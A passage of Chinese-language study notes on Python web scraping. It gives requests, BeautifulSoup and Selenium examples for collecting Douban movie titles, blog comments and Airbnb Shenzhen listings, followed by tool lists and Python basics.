= webdriver.FirefoxProfile()</span><br><span class="line"><span class="comment"># 1. 限制CSS的页面</span></span><br><span class="line">fp.set_preference(<span class="string">"permissions.default.stylesheet"</span>,<span class="number">2</span>) </span><br><span class="line"><span class="comment"># 2. 限制图片的显示。极大地提高网络爬虫的效率。图片文件相对于文字、CSS、JavaScript等文件都比较大，加载需要较长时间。</span></span><br><span class="line">fp.set_preference(<span class="string">"permissions.default.image"</span>,<span class="number">2</span>) </span><br><span class="line"><span class="comment"># 3. 控制JavaScript的运行。大多数网页都会利用JavaScript异步加载很多内容，如果这些内容不是需要的，其加载会浪费时间。</span></span><br><span class="line">fp.set_preference(<span class="string">"javascript.enabled"</span>, <span class="keyword">False</span>)</span><br></pre></td></tr></table></figure></p><p>全部限制对于加载速度的提升效果最好。如果能够限制，那么最好限制多种加载，这样的效果最好。<br>具体的加载速度提升还得看相应的网页，若网页的图片比较多，则限制图片的加载肯定效果很好。</p><p>参考链接：<a href="https://github.com/Santostang/PythonScraping/blob/master/%E7%AC%AC%E4%B8%80%E7%89%88/Cha%204%20-%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E6%8A%93%E5%8F%96/Cha%204%20-%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E6%8A%93%E5%8F%96.ipynb" target="_blank" rel="noopener">selenium</a></p><h1 id="2-典型应用"><a href="#2-典型应用" class="headerlink" title="2. 典型应用"></a>2. 典型应用</h1><h3 id="2-0-3-简单的爬虫"><a href="#2-0-3-简单的爬虫" class="headerlink" title="2.0.3. 简单的爬虫"></a>2.0.3. 简单的爬虫</h3><p>【用到的库】requests + bs4<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://github.com/Santostang/PythonScraping/blob/master/第一版/Cha 2 - 编写你的第一个网络爬虫/Cha 2 _章末实战.ipynb  </span></span><br><span class="line"><span class="comment">#!/usr/bin/python  </span></span><br><span class="line"><span class="comment"># coding: utf-8  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup   <span class="comment">#从bs4这个库中导入BeautifulSoup  </span></span><br><span class="line"><span class="comment"># 第一步：获取页面  </span></span><br><span class="line">link = <span class="string">"http://www.santostang.com/"</span>  </span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span> : <span class="string">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'</span>&#125;  </span><br><span class="line">r = requests.get(link, headers= headers) <span class="comment"># requests的headers伪装成浏览器访问。r是requests的Response回复对象。  </span></span><br><span class="line"><span class="comment"># 第二步：提取需要的数据  </span></span><br><span class="line">soup = BeautifulSoup(r.text, <span class="string">"html.parser"</span>)      <span class="comment"># 使用BeautifulSoup解析这段网页。把HTML代码转化为soup对象。r.text是获取的网页内容代码  </span></span><br><span class="line">title = soup.find(<span class="string">"h1"</span>, class_=<span class="string">"post-title"</span>).a.text.strip() <span class="comment"># 提取第一篇文章的标题  </span></span><br><span class="line"><span class="keyword">print</span> (title)  </span><br><span class="line"><span class="comment"># 第三步：存储数据  </span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'title_test.txt'</span>, <span class="string">"a+"</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    f.write(title)  </span><br><span class="line">    </span><br><span class="line">```  </span><br><span class="line"><span class="comment">### 2.0.4. 爬取豆瓣电影TOP250  </span></span><br><span class="line">【用到的库】requests + bs4  </span><br><span class="line">获取豆瓣电影TOP250的所有电影的名称  </span><br><span class="line">网页地址为：https://movie.douban.com/top250  </span><br><span class="line">第一页有<span class="number">25</span>个电影  </span><br><span class="line">获取所有的<span class="number">250</span>页电影  </span><br><span class="line">总共<span class="number">10</span>页的内容  </span><br><span class="line">第二页：https://movie.douban.com/top250? start=25  </span><br><span class="line">第三页：https://movie.douban.com/top250? start=50  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```py  </span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_movies</span><span class="params">()</span>:</span>  </span><br><span class="line">    headers = &#123;  </span><br><span class="line">    <span class="string">'user-agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safari/537.36'</span>,  </span><br><span class="line">    <span class="string">'Host'</span>: <span class="string">'movie.douban.com'</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    movie_list = []  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):  </span><br><span class="line">        link = <span class="string">'https://movie.douban.com/top250?start='</span> + str(i * <span class="number">25</span>)  </span><br><span class="line">        r = requests.get(link, headers=headers, timeout= <span class="number">10</span>)  </span><br><span class="line">        <span class="keyword">print</span> (str(i+<span class="number">1</span>),<span class="string">"页响应状态码:"</span>, r.status_code)  </span><br><span class="line">   </span><br><span class="line">        soup = BeautifulSoup(r.text, <span class="string">"lxml"</span>)  </span><br><span class="line">        div_list = soup.find_all(<span class="string">'div'</span>, class_=<span class="string">'hd'</span>)  </span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> div_list:  </span><br><span class="line">            movie = each.a.span.text.strip()  </span><br><span class="line">            movie_list.append(movie)  </span><br><span class="line">    <span class="keyword">return</span> movie_list  </span><br><span class="line">   </span><br><span class="line">movies = get_movies()  </span><br><span class="line"><span class="keyword">print</span> (movies)  </span><br><span class="line"><span class="comment"># 原文有误  </span></span><br><span class="line"><span class="comment"># 用 ]: 便于在 ipynb 中查找下一项  </span></span><br><span class="line">```  </span><br><span class="line">参考链接：豆瓣电影(https://github.com/Santostang/PythonScraping/blob/master/第一版/Cha <span class="number">3</span> -静态网页抓取/Cha <span class="number">3</span> _章末实战.ipy)  </span><br><span class="line"></span><br><span class="line">进阶问题：获取TOP <span class="number">250</span>电影的英文名、港台名、导演、主演、上映年份、电影分类以及评分。  </span><br><span class="line"><span class="comment">### 2.0.5. 爬取动态网页  </span></span><br><span class="line">【用到的库】requests + json  </span><br><span class="line">AJAX加载的动态网页，有两种爬取方法：  </span><br><span class="line">（<span class="number">1</span>）通过浏览器审查元素解析地址。  </span><br><span class="line">（<span class="number">2</span>）通过Selenium模拟浏览器抓取。  </span><br><span class="line"></span><br><span class="line">两个特别重要的变量，即offset和limit。  </span><br><span class="line">limit：每一页评论数量的最大值  </span><br><span class="line">offset：本页的第一条评论是总的第几条  </span><br><span class="line"></span><br><span class="line">```py  </span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> json  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_page_comment</span><span class="params">(link)</span>:</span>  </span><br><span class="line">    headers = &#123;<span class="string">'User-Agent'</span> : <span class="string">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'</span>&#125;  </span><br><span class="line">    r = requests.get(link, headers= headers)  </span><br><span class="line">    <span class="comment"># 获取 json 的 string  </span></span><br><span class="line">    json_string = r.text  </span><br><span class="line">    json_string = json_string[json_string.find(<span class="string">'&#123;'</span>):<span class="number">-2</span>]  </span><br><span class="line">    json_data = json.loads(json_string) <span class="comment"># 使用json.loads()把字符串格式的响应体数据转化为json数据  </span></span><br><span class="line">    comment_list = json_data[<span class="string">'results'</span>][<span class="string">'parents'</span>] <span class="comment"># json数据的结构提取  </span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> eachone <span class="keyword">in</span> comment_list:  </span><br><span class="line">        message = eachone[<span class="string">'content'</span>]  </span><br><span class="line">        <span class="keyword">print</span> (message)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> page <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">4</span>):  </span><br><span class="line">    link1 = <span class="string">"https://api-zero.livere.com/v1/comments/list?callback=jQuery112407875296433383039_1506267778283&amp;limit=10&amp;offset="</span>  </span><br><span class="line">    link2 = <span class="string">"&amp;repSeq=3871836&amp;requestPath=%2Fv1%2Fcomments%2Flist&amp;consumerSeq=1020&amp;livereSeq=28583&amp;smartloginSeq=5154&amp;_=1506267778285"</span>  </span><br><span class="line">    page_str = str(page)  </span><br><span class="line">    link = link1 + page_str + link2  </span><br><span class="line">    <span class="keyword">print</span> (link)  </span><br><span class="line">    single_page_comment(link)  </span><br><span class="line">```  </span><br><span class="line">参考链接：  </span><br><span class="line">https://github.com/Santostang/PythonScraping/blob/master/第一版/Cha <span class="number">4</span> -动态网页抓取/Cha <span class="number">4</span> -动态网页抓取.ipynb  </span><br><span class="line"><span class="comment">### 2.0.6. 通过Selenium模拟浏览器抓取  </span></span><br><span class="line">```py</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">driver = webdriver.Firefox()</span><br><span class="line">driver.get(<span class="string">"https://www.dianping.com/search/category/7/10/p1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果运行之后，发现程序报错：</span></span><br><span class="line"><span class="comment">#     selenium.common.exceptions.WebDriverException: Message: 'geckodriver' executable needs to be in PATH.</span></span><br><span class="line"><span class="comment"># 可以到https://github.com/mozilla/geckodriver/releases下载最新版的geckodriver，解压后可以放在Python安装目录（可能是Script子文件夹）下（可能需并放在环境变量的PATH中）。</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.firefox.firefox_binary <span class="keyword">import</span> FirefoxBinary   </span><br><span class="line">caps = webdriver.DesiredCapabilities().FIREFOX</span><br><span class="line">caps[<span class="string">"marionette"</span>] = <span class="keyword">False</span></span><br><span class="line">   </span><br><span class="line">path =  <span class="string">r'D:\\Program Files\\Mozilla Firefox\\firefox.exe'</span></span><br><span class="line">binary = FirefoxBinary(path) <span class="comment"># Firefox程序的地址  </span></span><br><span class="line">driver = webdriver.Firefox(firefox_binary=binary, capabilities=caps)</span><br><span class="line">driver.get(<span class="string">"http://www.santostang.com/2017/03/02/hello-world/"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    load_more = driver.find_element_by_css_selector(<span class="string">'div.tie-load-more'</span>)   <span class="comment"># 更多或下一页</span></span><br><span class="line">    load_more.click()            <span class="comment"># 模拟单击</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span>    </span><br><span class="line">comments = driver.find_elements_by_css_selector(<span class="string">'div.bdy- inner'</span>) </span><br><span class="line">time.sleep(<span class="number">5</span>)  </span><br><span class="line"></span><br><span class="line">user = driver.find_element_by_name(<span class="string">"username"</span>)  <span class="comment">#找到用户名输入框</span></span><br><span class="line">user.clear  <span class="comment">#清除用户名输入框内容</span></span><br><span class="line">user.send_keys(<span class="string">"1234567"</span>)  <span class="comment">#在框中输入用户名</span></span><br><span class="line">pwd = driver.find_element_by_name(<span class="string">"password"</span>)  <span class="comment">#找到密码输入框</span></span><br><span class="line">pwd.clear  <span class="comment">#清除密码输入框内容</span></span><br><span class="line">pwd.send_keys(<span class="string">"＊＊＊＊＊＊"</span>)    <span class="comment">#在框中输入密码</span></span><br><span class="line">driver.find_element_by_id(<span class="string">"loginBtn"</span>).click()  <span class="comment">#单击登录</span></span><br></pre></td></tr></table></figure></p><h3 id="2-0-7-深圳短租"><a href="#2-0-7-深圳短租" class="headerlink" title="2.0.7. 深圳短租"></a>2.0.7. 深圳短租</h3><p>目的：获取Airbnb深圳前20页的短租房源的名称、价格、评价数量、房屋类型、床数量和房客数量。监控和了解竞争对手的房屋名称和价格，让自己的房子有竞争力。<br>网址：<a href="https://zh.airbnb.com/s/Shenzhen--China?page=1" target="_blank" rel="noopener">https://zh.airbnb.com/s/Shenzhen--China?page=1</a></p><p>4.4.1 网站分析</p><p>一个房子的所有数据。地址为：div.infoContainer_v72lrv。<br>价格数据，地址为：div.priceContainer_4ml1ll<br>评价数据，地址为：span.text_5mbkop-o_O-size_micro_16wifzf-o_O-inline_g86r3e<br>房屋名称数据，地址为：div.listingNameContainer_kq7ac0-o_O-ellipsized_1iurgbx<br>房间类型、床数量和房客数量，地址为：span.detailWithoutWrap_j1kt73</p><p>4.4.2 项目实践<br>用Selenium获取Airbnb第一页的数据。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.firefox.firefox_binary <span class="keyword">import</span> FirefoxBinary</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">caps = webdriver.DesiredCapabilities().FIREFOX</span><br><span class="line">caps[<span class="string">"marionette"</span>] = <span class="keyword">True</span></span><br><span class="line">binary = FirefoxBinary(<span class="string">r'C:\Program Files\Firefox Developer Edition\firefox.exe'</span>)</span><br><span class="line"><span class="comment"># 把上述地址改成你电脑中Firefox程序的地址 </span></span><br><span class="line"><span class="comment"># 如果没改，会出现selenium.common.exceptions.SessionNotCreatedException: Message: Unable to find a matching set of capabilities</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#用 selenium 的 driver 来启动 firefox</span></span><br><span class="line">driver = webdriver.Firefox(firefox_binary=binary, capabilities=caps)</span><br><span class="line"><span class="comment">#在虚拟浏览器中打开 Airbnb 页面。使用Selenium打开该页面</span></span><br><span class="line">driver.get(<span class="string">"https://zh.airbnb.com/s/Shenzhen--China?page=1"</span>)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">20</span>)</span><br><span class="line"><span class="comment">#找到页面中所有的出租房。用Selenium的css selector获取所有房屋的div数据</span></span><br><span class="line">rent_list = driver.find_elements_by_css_selector(<span class="string">'div._1788tsr0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#对于每一个出租房</span></span><br><span class="line"><span class="keyword">for</span> eachhouse <span class="keyword">in</span> rent_list:</span><br><span class="line">    <span class="comment">#找到评论数量</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        comment = eachhouse.find_element_by_css_selector(<span class="string">'span._gb7fydm'</span>)</span><br><span class="line">        comment = comment.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        comment = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#找到价格</span></span><br><span class="line">    price = eachhouse.find_element_by_css_selector(<span class="string">'span._hylizj6'</span>)</span><br><span class="line">    price = price.text[<span class="number">4</span>:]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#找到名称</span></span><br><span class="line">    name = eachhouse.find_element_by_css_selector(<span class="string">'div._ew0cqip'</span>)</span><br><span class="line">    name = name.text</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#找到房屋类型，大小</span></span><br><span class="line">    details = eachhouse.find_elements_by_css_selector(<span class="string">'div._saba1yg small div span'</span>)</span><br><span class="line">    details = details[<span class="number">0</span>].text</span><br><span class="line">    house_type = details.split(<span class="string">" · "</span>)[<span class="number">0</span>]</span><br><span class="line">    bed_number = details.split(<span class="string">" · "</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">print</span> (comment, price, name, house_type, bed_number)</span><br></pre></td></tr></table></figure><p>进阶：将Selenium的控制CSS加载、控制图片加载和控制JavaScript加载加入本实践项目的代码中，从而提升爬虫的速度。</p><p><a href="https://github.com/Santostang/PythonScraping/blob/master/%E7%AC%AC%E4%B8%80%E7%89%88/Cha%204%20-%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E6%8A%93%E5%8F%96/Cha%204%20_%E7%AB%A0%E6%9C%AB%E5%AE%9E%E6%88%98.ipynb" target="_blank" rel="noopener">https://github.com/Santostang/PythonScraping/blob/master/%E7%AC%AC%E4%B8%80%E7%89%88/Cha%204%20-%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E6%8A%93%E5%8F%96/Cha%204%20_%E7%AB%A0%E6%9C%AB%E5%AE%9E%E6%88%98.ipynb</a></p><h1 id="3-工具及资源列表"><a href="#3-工具及资源列表" class="headerlink" title="3. 工具及资源列表"></a>3. 工具及资源列表</h1><h2 id="3-1-网络下载"><a href="#3-1-网络下载" class="headerlink" title="3.1. 网络下载"></a>3.1. 网络下载</h2><p>Anaconda： <a href="https://www.continuum.io/downloads" target="_blank" rel="noopener">https://www.continuum.io/downloads</a> 。<br>Robomongo：MongoDB数据库的可视化管理工具。<br>Redis Desktop Manager：Redis的可视化管理工具。  </p><ul><li>下载 <a href="https://redisdesktop.com/download" target="_blank" rel="noopener">https://redisdesktop.com/download</a>  </li><li>界面 <a href="https://res.weread.qq.com/wrepub/epub_928559_154" target="_blank" rel="noopener">https://res.weread.qq.com/wrepub/epub_928559_154</a>  </li></ul><p>Alt + Enter jupyter快捷键  </p><h2 id="3-2-书籍辅助"><a href="#3-2-书籍辅助" class="headerlink" title="3.2. 书籍辅助"></a>3.2. 书籍辅助</h2><ul><li>Python网络爬虫从入门到实践，唐松  </li></ul><ul><li>Github：<a href="https://github.com/Santostang/PythonScraping" target="_blank" rel="noopener">https://github.com/Santostang/PythonScraping</a><br>百度网：<a href="http://pan.baidu.com/s/1c2w9rck" target="_blank" rel="noopener">http://pan.baidu.com/s/1c2w9rck</a><br>书本对应的Python网络爬虫的教学:<a href="http://www.santostang.com" target="_blank" rel="noopener">www.santostang.com</a><br>网站不会更改设计和框架，本书的网络爬虫代码可以一直使用<br>作者自己的博客网站，可以避免一些法律上的风险  <h2 id="3-3-端口"><a href="#3-3-端口" class="headerlink" title="3.3. 端口"></a>3.3. 端口</h2>jupyter：8888  <h1 id="4-库"><a href="#4-库" class="headerlink" title="4. 库"></a>4. 库</h1><h2 id="4-1-Python第三方库"><a href="#4-1-Python第三方库" class="headerlink" title="4.1. Python第三方库"></a>4.1. Python第三方库</h2>基本格式：（安装时，把name替换为要安装的第三方库）  </li><li><code>pip install name</code>  </li><li><code>pip install -i https://pypi.tuna.tsinghua.edu.cn/simple name</code>  </li></ul><ul><li>科学计算的包，如Numpy、Scipy、Pandas和Matplotlib。  </li><li>机器学习、生物医学和天体物理学计算，如Scikit-Learn、BioPython。  </li><li>获取网页：requests、urllib、selenium  </li><li>解析数据：lxml、bs4的BeautifulSoup、re(标准库)  </li><li>存储数据：MySQL、MongoDB  <h1 id="5-附录"><a href="#5-附录" class="headerlink" title="5. 附录"></a>5. 附录</h1><h1 id="6-单项分析"><a href="#6-单项分析" class="headerlink" title="6. 单项分析"></a>6. 单项分析</h1><h2 id="6-1-是什么"><a href="#6-1-是什么" class="headerlink" title="6.1. 是什么"></a>6.1. 是什么</h2>Anaconda：Python开发集成环境。南美洲的巨蟒。自带Python、pip和Jupyter。<br>第三方库：可理解为供用户调用的代码组合。在安装某个库之后，可以直接调用其中的功能，使得我们不用一个代码一个代码地实现某个功能。<br>DT（Data Technology，数据技术）  </li></ul><p>命令提示符。输入一些命令后，可执行对系统的管理。 Windows的cmd，开始按钮→cmd。Mac的terminal。应用程序→terminal。<br>爬虫：<br>pip：Python安装各种第三方库（package）的工具。<br>Python：蟒蛇<br>数据交换：网站与用户的沟通本质。  </p><p>print<br>代码缩进：代码要按照结构以Tab键或者4个空格进行缩进严格缩进<br>注释：#  </p><p>Python不需要在使用之前声明需要使用的变量和类别。<br>字符串（string）：单引号（’）或双引号（”）<br>连接字符串: +  </p><p>数字（Number）：数字用来存储数值<br>整数（int）<br>浮点数（float）：由整数和小数部分组成。  </p><p>列表（list）:能够包含任意种类的数据类型和任意数量。<br>创建列表非常容易，只要把不同的变量放入方括号中，并用逗号分隔即可，例如list0 = [“a”,2,”c”,4]<br>增删查改、索引、切片<br>字典（Dictionaries）：一种可变容器模型。<br>键（key）和值（value）。key必须唯一，但是值不用。值也可以取任何数据类型。<br>遍历<br>条件语句：满足条件的时候才执行某部分代码。条件为布尔值，也就是只有True和False两个值。<br>    当if判断条件成立时才执行后面的语句；当条件不成立的时候，执行else后面的语句<br>    如果需要判断的有多种条件，就需要用到elif<br>无序：字典<br>有序：列表、元组<br>对象有两种，即可更改（mutable）与不可更改（immutable）对象。在Python中，strings、tuples和numbers是不可更改对象，而list、dict等是可更改对象。  </p><p>循环语句：多次执行一个代码片段。<br>循环分为for循环和while循环。<br>for循环：在一个给定的顺序下重复执行。<br>while循环：不断重复执行，只要能满足一定条件。  </p><p>函数<br>代码庞大复杂时，使得代码易读，可重复使用，并且容易调整顺序。<br>函数的参数与返回值  </p><p>面向过程编程：根据业务逻辑从上到下写代码，最容易被初学者接受。<br>函数式编程：把某些功能封装到函数中，需要用时可以直接调用，不用重复撰写。函数式的编程方法节省了大量时间。只需要写清楚输入和输出变量并执行函数即可。<br>面向对象编程：把函数进行分类和封装后放入对象中，使得开发更快、更强。首先要创建封装对象，然后还要通过对象调用被封装的内容。在某些应用场景下，面向对象编程能够显示出更大的优势。<br>如果各个函数之间独立且无共用的数据，就选用函数式编程；如果各个函数之间有一定的关联性，选用面向对象编程比较好。<br>特性与行为，属性和方法<br>面向对象的两大特性：封装和继承。<br>封装：把内容封装好，再调用封装好的内容。使用构造方法将内容封装到对象中，然后通过对象直接或self间接获取被封装的内容。<br>继承：以普通的类为基础建立专门的类对象。子继承了父的某些特性。将多个类共有的方法提取到父类中，子类继承父类中的方法即可，不必一一实现每个方法。  </p><p>【状态码】<br>200，请求成功<br>4xx，客户端错误<br>5xx，服务器错误<br>【请求头】<br>Headers：提供了关于请求、响应或其他发送实体的信息。<br>如果没有指定请求头或请求的请求头和实际网页不一致，就可能无法返回正确的结果。  </p><p>Chrome浏览器的检查。单击需要请求的网页，在Headers中可以看到Requests Headers的详细信息。  </p><p>请求头的信息为：<br>GET / HTTP/1.1<br>Host: <a href="http://www.santostang.com" target="_blank" rel="noopener">www.santostang.com</a><br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36<br>Accept:<br>text/html, application/xhtml+xml, application/xml; q=0.9, image/webp, <em>/</em>; q=0.8 Accept-Encoding: gzip, deflate, sdch<br>Accept-Language: en-US, en; q=0.8, zh-CN; q=0.6, zh; q=0.4, zh-TW; q=0.2  </p><p>GET请求，密码会显示在URL中，非常不安全。<br>POST请求，<br>【动态网页】<br>AJAX（Asynchronous Javascript And XML，异步JavaScript和XML），一种异步更新技术。<br>单击“更多”，url地址没有任何改变，有新内容加载出来。<br>数据不会出现在网页源代码中。但是有JavaScript代码。<br>最后呈现出来的数据是通过JavaScript加载的。  </p><p>通过在后台与服务器进行少量数据交换就可以使网页实现异步更新。<br>在不重新加载整个网页的情况下对网页的某部分进行更新。<br>减少了网页重复内容的下载<br>节省了流量<br>更小、更快、更友好  </p><p>传统的网页必须重载整个网页页面  </p><p>动态网页的例子<br><a href="http://www.santostang.com/2018/07/04/hello-world/" target="_blank" rel="noopener">http://www.santostang.com/2018/07/04/hello-world/</a>  </p><p>页面下面的评论用JavaScript加载。评论数据没法在在网页源代码找到。  </p><h3 id="6-1-1-Selenium"><a href="#6-1-1-Selenium" class="headerlink" title="6.1.1. Selenium"></a>6.1.1. Selenium</h3><p>Selenium官方文档：<a href="http://selenium-python.readthedocs.io/index.html。" target="_blank" rel="noopener">http://selenium-python.readthedocs.io/index.html。</a>  </p><p>Selenium要在整个网页加载出来后才开始爬取内容，速度往往较慢。  </p><p>Selenium可以实现的功能：<br>操作元素对浏览器中的网页进行各种操作，包括登录。<br>模拟鼠标单击、双击、拖拽<br>获得网页中各个元素的大小<br>模拟键盘<br>浏览器渲染引擎。直接用浏览器在显示网页时解析HTML、应用CSS样式并执行JavaScript的语句。Selenium使用浏览器渲染，数据已经渲染到了HTML代码中。用chrome定位标签即可。<br>用脚本控制浏览器操作。Python的Selenium库模拟浏览器完成抓取。<br>Selenium：用于Web应用程序测试的工具。Selenium测试直接运行在浏览器中，浏览器自动按照脚本代码做出单击、输入、打开、验证等操作，就像真正的用户在操作一样。</p><p>用Selenium控制浏览器加载的内容，可加快Selenium的爬取速度。此类常用的方法有：<br>（1）控制CSS的加载。<br>（2）控制图片文件的显示。<br>（3）控制JavaScript的运行。<br>（1）控制CSS。因为抓取过程中仅仅抓取页面的内容，CSS样式文件是用来控制页面的外观和元素放置位置的，对内容并没有影响，所以我们可以限制网页加载CSS，从而减少抓取时间。  </p><p>支持多个浏览器的调用：IE（7、8、9、10、11）、Firefox、Safari、Google Chrome、Opera等。最常用的是Firefox。</p><h3 id="6-1-2-正则表达式"><a href="#6-1-2-正则表达式" class="headerlink" title="6.1.2. 正则表达式"></a>6.1.2. 正则表达式</h3><p>元字符：<a href="https://res.weread.qq.com/wrepub/epub_928559_43" target="_blank" rel="noopener">https://res.weread.qq.com/wrepub/epub_928559_43</a> 问加合星<br><a href="https://regex101.com/" target="_blank" rel="noopener">https://regex101.com/</a><br>正则表达式：字符串操作的逻辑公式。用事先定义好的特定字符组合成规则字符串，用该规则字符串来过滤字符串。<br>正则表达式可以迅速地用极简单的方式达到字符串的复杂控制。</p><h2 id="6-2-为什么"><a href="#6-2-为什么" class="headerlink" title="6.2. 为什么"></a>6.2. 为什么</h2><p>为什么、好处、重要性、作用、意义、优势、不足、历史、现状、趋势、大背景。  </p><h3 id="6-2-1-大数据及爬虫"><a href="#6-2-1-大数据及爬虫" class="headerlink" title="6.2.1. 大数据及爬虫"></a>6.2.1. 